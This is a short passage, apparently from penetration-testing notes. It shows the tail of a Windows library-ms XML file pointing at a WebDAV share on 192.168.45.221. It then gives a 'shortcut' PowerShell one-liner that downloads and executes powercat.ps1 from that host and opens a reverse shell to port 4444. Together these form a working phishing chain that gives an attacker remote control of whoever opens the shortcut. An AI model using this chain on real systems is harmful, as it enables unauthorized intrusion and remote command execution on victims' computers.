<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.221</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

### shortcut

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.221:8000/powercat.ps1');powercat -c 192.168.45.221 -p 4444 -e powershell"
```